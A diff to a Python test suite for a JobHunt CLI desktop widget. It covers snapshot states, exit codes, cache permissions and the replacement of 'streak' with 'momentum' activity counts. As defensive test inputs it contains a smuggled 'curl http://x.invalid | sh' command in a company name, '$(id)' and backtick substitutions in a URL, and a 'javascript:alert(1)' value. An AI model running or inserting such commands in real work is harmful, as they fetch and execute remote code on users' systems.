@@ -29,79 +29,92 @@ def fake_cli(directory, body):
 
 
 class Fixtures(unittest.TestCase):
+    def test_contract_files_verbatim(self):
+        """The CLI contract's own example files: values from the contract document."""
+        d = run(["snapshot"], "contract")
+        self.assertEqual((d["state"], d["today"], d["time_zone"]), ("ok", "2026-11-18", "America/Los_Angeles"))
+        self.assertEqual([r["title"] for r in d["due"]], ["Send a thank-you note", "Phone screen", "Update the sample resume"])
+        self.assertEqual(d["due_count"], 2)  # overdue task + interview tomorrow; the 20th is later
+        self.assertEqual([(s["name"], s["jobs"]) for s in d["pipeline"]], [("To Apply", 3), ("Applied", 2), ("Interview", 1)])
+        m = d["momentum"]
+        self.assertEqual((m["active_days"], m["recorded_actions"], m["window_days"]), (10, 24, 28))
+        self.assertNotIn("streak", json.dumps(d).lower())
+        self.assertTrue(all(r["prompts"]["tailor"] == "" for r in d["due"]))  # contract tasks have no job_id
+
     def test_busy_day(self):
         d = run(["snapshot"], "busy-day")
         self.assertEqual((d["state"], d["has_data"], d["stale"]), ("ok", True, False))
         self.assertEqual(d["due_count"], 3)
-        self.assertEqual([r["bucket"] for r in d["due"]].count("today"), 3)
         self.assertEqual(d["due"][0]["on"], "2026-11-15")  # soonest first
         self.assertEqual([r["on"] for r in d["due"]], sorted(r["on"] for r in d["due"]))
         self.assertNotIn("Hiring manager chat", [r["title"] for r in d["due"]])  # cancelled
         panel = next(r for r in d["due"] if r["title"] == "Panel interview")
         self.assertEqual(panel["time"], "13:30")  # 21:30Z in Los Angeles
-        self.assertIn("3f2a9c1e-5b7d-4e8a-9c21-0a1b2c3d4e5f", panel["prompts"]["prep"])
-        self.assertEqual(panel["prompts"]["tailor"], "")
-        phone = next(r for r in d["due"] if r["title"] == "Phone screen")
-        self.assertEqual(phone["prompts"], {"tailor": "", "prep": ""})  # no id in the contract, so no prompt
+        self.assertEqual(panel["prompts"], {"tailor": ""})  # interviews carry no id in the contract
+        task = next(r for r in d["due"] if r["title"] == "Send thank-you note")
+        self.assertEqual(task["prompts"]["tailor"], "In JobHunt, tailor my resume for the job with id 3f2a9c1e-5b7d-4e8a-9c21-0a1b2c3d4e5f. Show me the changes before saving.")
         self.assertTrue(all(r["url"].startswith("https://jobhunt.app/app") for r in d["due"]))
         self.assertEqual([s["name"] for s in d["pipeline"]], ["To Apply", "Applied", "Interviewing", "Offer", "Closed"])
-        self.assertEqual(d["streak"]["current_days"], 12)
-        self.assertEqual(sum(len(w) for w in d["streak"]["weeks"]) % 7, 0)
+        self.assertEqual(sum(len(w) for w in d["momentum"]["weeks"]) % 7, 0)
+        self.assertNotIn("streak", json.dumps(d).lower())
 
     def test_nothing_due(self):
         d = run(["snapshot"], "nothing-due")
         self.assertEqual((d["state"], d["due_count"], d["due"]), ("ok", 0, []))
-        self.assertEqual(d["streak"]["current_days"], 0)
+        self.assertEqual(d["momentum"]["recorded_actions"], 0)
 
-    def test_signed_out(self):
-        d = run(["snapshot"], "signed-out")
-        self.assertEqual((d["state"], d["has_data"], d["due"]), ("signed_out", False, []))
+    def test_signed_out_both_ways(self):
+        for name in ("signed-out", "revoked"):  # status false (exit 0), and overview exit 3
+            d = run(["snapshot"], name)
+            self.assertEqual((d["state"], d["has_data"], d["due"]), ("signed_out", False, []), name)
 
     def test_cli_missing(self):
         d = run(["snapshot"], "cli-missing")
         self.assertEqual((d["state"], d["has_data"]), ("cli_missing", False))
 
-    def test_stale_offline(self):
+    def test_stale_offline_and_rate_limited(self):
         d = run(["snapshot"], "stale-offline")
         self.assertEqual((d["state"], d["has_data"], d["stale"]), ("offline", True, True))
         self.assertEqual(d["age_seconds"], 6 * 3600)
         self.assertEqual(d["fetched_at"], "2026-11-17T09:00:00Z")
         self.assertEqual(d["due_count"], 3)
+        r = run(["snapshot"], "rate-limited")
+        self.assertEqual((r["state"], r["has_data"], r["stale"], r["retry_after_seconds"]), ("rate_limited", True, True, 120))
 
     def test_year_of_activity(self):
         d = run(["snapshot"], "year-of-activity")
-        days = [c for w in d["streak"]["weeks"] for c in w if c["date"]]
+        days = [c for w in d["momentum"]["weeks"] for c in w if c["date"]]
         self.assertEqual(len(days), 365)
-        self.assertEqual(days[-1]["date"], "2026-11-17")
-        self.assertEqual(days[0]["date"], "2025-11-18")
+        self.assertEqual((days[0]["date"], days[-1]["date"]), ("2025-11-18", "2026-11-17"))
         self.assertTrue(all(0 <= c["level"] <= 4 for c in days))
-        self.assertEqual(len(d["streak"]["weeks"]), 53)
-        for w in d["streak"]["weeks"]:
+        self.assertEqual(len(d["momentum"]["weeks"]), 53)
+        for w in d["momentum"]["weeks"]:
             self.assertEqual(len(w), 7)
+        self.assertEqual(d["momentum"]["recorded_actions"], sum(c["count"] for c in days))
 
     def test_hide_company(self):
         d = run(["snapshot", "--hide-company"], "busy-day")
         text = json.dumps(d)
         for name in ("Northwind", "Fabrikam", "Contoso"):
             self.assertNotIn(name, text)
-        self.assertTrue(d["hide_company"])
         self.assertIn("Staff Designer", text)
-        stale = json.dumps(run(["snapshot", "--hide-company"], "stale-offline"))
-        self.assertNotIn("Northwind", stale)
 
     def test_fixture_clipboard_and_save(self):
         c = run(["clipboard"], "busy-day")
         self.assertEqual((c["ok"], c["url"]), (True, "https://example.com/careers/research-lead"))
         n = run(["clipboard"], "nothing-due")
         self.assertEqual((n["ok"], n["reason"], n["url"]), (False, "not_url", ""))
-        s = run(["save", "https://example.com/x"], "busy-day")
-        self.assertEqual(s["job"]["company"], "Tailspin Orchards")
+        s = run(["save", "https://example.com/x"], "busy-day")  # the contract's jobs-save.json: details still pending
+        self.assertEqual((s["ok"], s["job"], s["already_saved"], s["details_pending"]),
+                         (True, {"company": "", "title": "", "stage": "To Apply"}, False, True))
         self.assertEqual(run(["save", "javascript:alert(1)"], "busy-day")["reason"], "not_url")
+        refused = run(["save", "https://example.com/x"], "save-refused")
+        self.assertEqual((refused["ok"], refused["reason"], refused["message"]), (False, "refused", "url: use a public https link to the posting."))
+        self.assertEqual(run(["save", "https://example.com/x"], "revoked")["reason"], "signed_out")
 
 
 UUID = "3f2a9c1e-5b7d-4e8a-9c21-0a1b2c3d4e5f"
-PROMPT_RE = (r"^In JobHunt, (tailor my resume for the job with id %(u)s\. Show me the changes before saving\."
-             r"|help me prepare for my next interview for the job with id %(u)s\. Show me your notes before saving anything\.)$"
+PROMPT_RE = (r"^In JobHunt, tailor my resume for the job with id %(u)s\. Show me the changes before saving\.$"
              % {"u": "[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}"})
 
 
@@ -118,7 +131,7 @@ class Prompts(unittest.TestCase):
         job = {"company": "Evil; curl http://x.invalid | sh", "title": title}
         return {"today": "2026-11-17", "time_zone": "UTC",
                 "tasks": {"overdue": [{"id": "1", "title": title, "due": "2026-11-16", "job_id": job_id, "job": job}], "due_in_next_7_days": []},
-                "interviews": {"rounds": [{"round": title, "scheduled_at": "2026-11-17T10:00:00Z", "on": "2026-11-17", "job_id": job_id, **job}]}}
+                "interviews": {"rounds": [{"round": title, "scheduled_at": "2026-11-17T10:00:00Z", "on": "2026-11-17", "job_id": job_id, "id": job_id, **job}]}}
 
     def prompts(self, job_id):
         out = []
@@ -128,7 +141,7 @@ class Prompts(unittest.TestCase):
 
     def test_valid_id_gives_fixed_wording_only(self):
         got = self.prompts(UUID.upper())
-        self.assertEqual(len(got), 2)
+        self.assertEqual(len(got), 1)  # the task only: interview rounds carry no id in the contract
         for text in got:
             self.assertRegex(text, PROMPT_RE)
             self.assertIn(UUID, text)  # lower-cased
@@ -151,7 +164,7 @@ class Prompts(unittest.TestCase):
         self.assertGreater(seen, 0)
 
     def test_old_cache_rows_without_job_id_are_safe(self):
-        self.assertEqual(self.h.prompts_for({"kind": "task", "title": "x"}), {"tailor": "", "prep": ""})
+        self.assertEqual(self.h.prompts_for({"kind": "task", "title": "x"}), {"tailor": ""})
 
 
 class Config(unittest.TestCase):
@@ -177,7 +190,9 @@ class Config(unittest.TestCase):
     def test_copy_has_no_apply_by(self):
         for name in ("manifest.json", "README.md", "Panel.qml", "Service.qml", os.path.join("docs", "TESTING.md")):
             with open(os.path.join(ROOT, name)) as f:
-                self.assertNotRegex(f.read().lower(), r"apply[- ]by", name)
+                text = f.read().lower()
+                self.assertNotRegex(text, r"apply[- ]by", name)
+                self.assertNotIn("streak", text, name)  # JobHunt shows factual activity, never streaks
 
 
 class Safety(unittest.TestCase):
@@ -218,86 +233,131 @@ class Safety(unittest.TestCase):
         d = self.h.normalise_overview({"today": "2026-11-17", "tasks": {"overdue": [None, 3, {"due": "bad"}]}})
         self.assertEqual(d["due"], [])
 
-    def test_streak_fallback(self):
-        a = self.h.normalise_activity({"today": "2026-11-17", "days": [{"date": "2026-11-16", "count": 2}, {"date": "2026-11-15", "count": 1}]}, "")
-        self.assertEqual(a["current_days"], 2)
+    def test_activity_is_counts_only(self):
+        a = self.h.normalise_activity({"today": "2026-11-17", "days": [{"date": "2026-11-16", "count": 2}, {"date": "2026-11-17", "count": 0}], "current_streak_days": 99}, "")
+        self.assertEqual((a["window_days"], a["recorded_actions"], a["active_days"]), (2, 2, 1))
+        self.assertNotIn("streak", json.dumps(a).lower())
+        with self.assertRaises(self.h.ShapeError):
+            self.h.normalise_activity({"today": "2026-11-17", "days": []}, "")
 
 
 class ShippedLaunchers(unittest.TestCase):
-    """fixtures/<scenario>/jobhunt are stand-in CLIs the owner points the cliPath setting at."""
+    """fixtures/<scenario>/jobhunt are stand-in CLIs the owner points the cliPath setting at.
+    They must behave like the fixture mode, including exit codes and stderr."""
 
     def test_launchers_match_fixture_mode(self):
         with tempfile.TemporaryDirectory() as tmp:
             env = {"JOBHUNT_OMARCHY_CACHE": os.path.join(tmp, "c.json"), "PATH": "/usr/bin:/bin"}
-            states = {}
-            for name in ("busy-day", "nothing-due", "year-of-activity", "signed-out"):
-                states[name] = run(["snapshot", "--cli", os.path.join(FIX, name, "jobhunt")], env=env)
-                self.assertEqual(states[name]["state"], run(["snapshot"], name)["state"], name)
-                self.assertEqual(states[name]["due_count"], run(["snapshot"], name)["due_count"], name)
-            run(["snapshot", "--cli", os.path.join(FIX, "busy-day", "jobhunt")], env=env)
-            off = run(["snapshot", "--cli", os.path.join(FIX, "stale-offline", "jobhunt")], env=env)
-            self.assertEqual((off["state"], off["stale"], off["has_data"]), ("offline", True, True))
+            for name in ("contract", "busy-day", "nothing-due", "year-of-activity", "signed-out", "revoked"):
+                via = run(["snapshot", "--cli", os.path.join(FIX, name, "jobhunt")], env=env)
+                direct = run(["snapshot"], name)
+                for key in ("state", "due_count", "has_data"):
+                    self.assertEqual(via[key], direct[key], (name, key))
+            for name, state in (("stale-offline", "offline"), ("rate-limited", "rate_limited")):
+                run(["snapshot", "--cli", os.path.join(FIX, "busy-day", "jobhunt")], env=env)
+                got = run(["snapshot", "--cli", os.path.join(FIX, name, "jobhunt")], env=env)
+                self.assertEqual((got["state"], got["stale"], got["has_data"]), (state, True, True), name)
+            refused = run(["save", "https://example.com/x", "--cli", os.path.join(FIX, "save-refused", "jobhunt")], env=env)
+            self.assertEqual(refused["reason"], "refused")
+            for name in ("contract", "busy-day"):
+                self.assertTrue(run(["save", "https://example.com/x", "--cli", os.path.join(FIX, name, "jobhunt")], env=env)["ok"])
 
 
 class RealProcessPath(unittest.TestCase):
-    """Runs a stand-in `jobhunt` program, so the subprocess code is exercised without the real CLI."""
+    """Runs a stand-in `jobhunt` program under the contract: success is JSON on stdout (exit 0);
+    failure is JSON on stderr with exit 2..8. The real subprocess code is exercised without the real CLI."""
 
     def setUp(self):
         self.tmp = tempfile.TemporaryDirectory()
         self.addCleanup(self.tmp.cleanup)
         self.cache = os.path.join(self.tmp.name, "c", "snapshot.json")
         self.env = {"JOBHUNT_OMARCHY_CACHE": self.cache, "PATH": "/usr/bin:/bin", "HOME": self.tmp.name}
+        self.fx = os.path.join(FIX, "busy-day")
 
-    def cli(self, status_out, overview_out, activity_out="", overview_code=0):
-        fx = os.path.join(FIX, "busy-day")
-        body = {"status": status_out, "overview": overview_out, "activity": activity_out}
+    def cli(self, overview="cat %s/overview.json", activity="cat %s/activity.json", status="echo '{\"signed_in\":true}'", save=None):
+        """Each argument is shell text for that command; use fail(code, json) for a contract failure."""
         script = "case \"$1\" in\n"
-        for k, v in body.items():
-            script += "  %s) %s ; exit %d ;;\n" % (k, v or ":", overview_code if k == "overview" else 0)
-        script += "  jobs) cat %s/jobs-save.json ; echo \"$@\" > %s/argv ;;\nesac\n" % (fx, self.tmp.name)
+        script += "  status) %s ;;\n" % status
+        script += "  overview) %s ;;\n" % (overview % self.fx if "%s" in overview else overview)
+        script += "  activity) %s ;;\n" % (activity % self.fx if "%s" in activity else activity)
+        script += "  jobs) %s ; echo \"$@\" > %s/argv ;;\n" % (save or "cat %s/jobs-save.json" % self.fx, self.tmp.name)
+        script += "esac\n"
         return fake_cli(self.tmp.name, script)
 
+    @staticmethod
+    def failing(code, body):
+        return "echo '%s' >&2; exit %d" % (body, code)
+
+    def snap(self, **kw):
+        return run(["snapshot", "--cli", self.cli(**kw)], env=self.env)
+
     def test_ok_writes_private_cache_then_offline_uses_it(self):
-        fx = os.path.join(FIX, "busy-day")
-        cli = self.cli("echo '{\"signed_in\":true}'", "cat %s/overview.json" % fx, "cat %s/activity.json" % fx)
-        d = run(["snapshot", "--cli", cli], env=self.env)
+        d = self.snap()
         self.assertEqual(d["state"], "ok")
         self.assertEqual(stat.S_IMODE(os.stat(self.cache).st_mode), 0o600)
         self.assertEqual(stat.S_IMODE(os.stat(os.path.dirname(self.cache)).st_mode), 0o700)
-        down = self.cli("echo '{\"signed_in\":true}'", "exit 1", "exit 1", overview_code=1)
-        d = run(["snapshot", "--cli", down], env=self.env)
+        d = self.snap(overview=self.failing(7, '{"error":{"code":"unreachable","status":0}}'), activity=self.failing(7, "{}"))
         self.assertEqual((d["state"], d["stale"], d["has_data"]), ("offline", True, True))
-        self.assertEqual(d["streak"]["current_days"], 12)
+        self.assertEqual(d["momentum"]["active_days"], 185)
 
-    def test_signed_out_removes_cache(self):
-        fx = os.path.join(FIX, "busy-day")
-        run(["snapshot", "--cli", self.cli("echo '{\"signed_in\":true}'", "cat %s/overview.json" % fx)], env=self.env)
+    def test_exit_codes_map_to_states(self):
+        self.snap()  # prime the cache
+        cases = {
+            7: ("offline", '{"error":{"code":"unreachable","status":0}}'),
+            6: ("rate_limited", '{"error":{"code":"rate_limited","status":429,"retry_after_seconds":90}}'),
+            4: ("error", '{"error":{"code":"insufficient_scope","status":403}}'),
+            2: ("error", '{"error":{"code":"invalid_input","status":0}}'),
+            5: ("error", '{"error":{"code":"conflict","status":409}}'),
+            8: ("error", '{"error":{"code":"not_found","status":404}}'),
+        }
+        for code, (state, body) in cases.items():
+            d = self.snap(overview=self.failing(code, body))
+            self.assertEqual((d["state"], d["has_data"], d["stale"]), (state, True, True), code)
+            if code == 6:
+                self.assertEqual(d["retry_after_seconds"], 90)
+        self.assertIn("permission", self.snap(overview=self.failing(4, "{}"))["message"])
+
+    def test_signed_out_by_exit_3_removes_cache(self):
+        self.snap()
         self.assertTrue(os.path.exists(self.cache))
-        d = run(["snapshot", "--cli", self.cli("echo '{\"signed_in\":false}'", "")], env=self.env)
-        self.assertEqual(d["state"], "signed_out")
+        d = self.snap(overview=self.failing(3, '{"error":{"code":"authentication_required","status":401}}'))
+        self.assertEqual((d["state"], d["has_data"]), ("signed_out", False))
         self.assertFalse(os.path.exists(self.cache))
 
-    def test_auth_error_from_overview(self):
-        cli = self.cli("echo '{\"signed_in\":true}'", "echo '{\"error\":{\"code\":\"authentication_required\"}}'", overview_code=1)
-        self.assertEqual(run(["snapshot", "--cli", cli], env=self.env)["state"], "signed_out")
+    def test_status_false_and_status_unreachable(self):
+        self.snap()
+        d = self.snap(status="echo '{\"signed_in\":false}'")
+        self.assertEqual(d["state"], "signed_out")
+        self.assertFalse(os.path.exists(self.cache))
+        self.assertEqual(self.snap(status=self.failing(7, "{}"))["state"], "offline")  # no cache now: no data
+        self.assertFalse(self.snap(status=self.failing(7, "{}"))["has_data"])
 
     def test_garbage_and_oversize(self):
-        cli = self.cli("echo '{\"signed_in\":true}'", "echo not json")
-        self.assertEqual(run(["snapshot", "--cli", cli], env=self.env)["state"], "error")
-        big = self.cli("echo '{\"signed_in\":true}'", "head -c 3000000 /dev/zero | tr '\\0' 'a'")
-        self.assertEqual(run(["snapshot", "--cli", big], env=self.env)["state"], "error")
+        self.assertEqual(self.snap(overview="echo not json")["state"], "error")
+        self.assertEqual(self.snap(overview="head -c 3000000 /dev/zero | tr '\\0' 'a'")["state"], "error")
+        self.assertEqual(self.snap(overview="echo '{\"ok\":true}'")["state"], "error")  # no `today`
+
+    def test_failure_text_is_never_repeated(self):
+        d = self.snap(overview=self.failing(2, '{"error":{"code":"x","status":0,"message":"SECRET-WORDS <b>"}}'))
+        self.assertNotIn("SECRET", json.dumps(d))
 
     def test_missing_cli(self):
-        d = run(["snapshot"], env=self.env)
-        self.assertEqual(d["state"], "cli_missing")
+        self.assertEqual(run(["snapshot"], env=self.env)["state"], "cli_missing")
 
     def test_save_passes_url_as_one_argument(self):
-        cli = self.cli("echo '{\"signed_in\":true}'", "")
         url = "https://example.com/job?x=$(id)&y=`id`"
-        d = run(["save", url, "--cli", cli], env=self.env)
+        d = run(["save", url, "--cli", self.cli()], env=self.env)
         self.assertTrue(d["ok"])
         with open(os.path.join(self.tmp.name, "argv")) as f:
             self.assertEqual(f.read().strip(), "jobs save %s --json" % url)
+
+    def test_save_failures(self):
+        refused = self.failing(2, '{"error":{"code":"invalid_input","status":422,"message":"url: use a public https link to the posting."}}')
+        for code, reason in ((3, "signed_out"), (7, "unreachable"), (6, "rate_limited"), (4, "permission"), (5, "failed")):
+            d = run(["save", "https://example.com/x", "--cli", self.cli(save=self.failing(code, "{}"))], env=self.env)
+            self.assertEqual((d["ok"], d["reason"]), (False, reason), code)
+        d = run(["save", "https://example.com/x", "--cli", self.cli(save=refused)], env=self.env)
+        self.assertEqual((d["reason"], d["message"]), ("refused", "url: use a public https link to the posting."))
 
 
 if __name__ == "__main__":
